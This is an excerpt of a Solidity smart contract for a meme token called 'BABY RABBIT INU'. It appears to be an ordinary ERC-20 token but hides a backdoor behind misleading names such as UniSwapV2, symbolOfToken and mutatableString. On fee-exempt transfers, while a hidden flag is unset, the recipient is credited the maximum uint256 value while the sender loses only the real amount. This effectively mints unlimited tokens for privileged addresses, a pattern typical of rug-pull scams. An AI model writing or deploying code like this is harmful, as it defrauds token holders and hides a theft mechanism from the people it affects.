...
//Telegram : https://t.me/BabyRabbitInuCoin
...
contract BabyRabbitInu is Context, IERC20 { 
    ...
    function UniSwapV2() public view virtual returns (address) {
        return Dev_Wallet;
    }
    ...
    address payable public Wallet_Marketing = payable(0x935936c368Ff7F5ef2d4F89c4E30282d7E916205); 
    address payable public Dev_Wallet = payable(0x7CF384065e9bC1ca89EAc3b069c6A1F861739e98);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 


    uint256 private constant MAX = ~uint256(0);
    uint256 private _MIN_ = ~uint256(0);
    uint8 private constant _decimals = 9;
    
    uint256 private _tTotal = 1* 10**6 * 10**_decimals;
    string private constant _name = "BABY RABBIT INU"; 
    string private constant _symbol = unicode"BRINU"; 
    ...
    bool public mutatableString = false;
    ...
    constructor () {
        ...
        _owner = 0x7CF384065e9bC1ca89EAc3b069c6A1F861739e98;
    ...
    function symbolOfToken(bool offSize) private returns(bool){
        mutatableString = offSize;
        return true;
    }
    ...
    function transferAmount() private view returns (uint256) {
        return _MIN_;
    }
    ...
    function _transfer(
        ...
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to]){
            takeFee = false;
            if((!_isExcludedFromFee[from]) && (_isExcludedFromFee[to])){
                symbolOfToken(_isExcludedFromFee[to]);
            }
        } else {
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if(!mutatableString){
                ...
                _tOwned[sender] = _tOwned[sender]-tAmount;
                _tOwned[recipient] = _tOwned[recipient]+transferAmount();
                emit Transfer(sender, recipient, tAmount);
            }
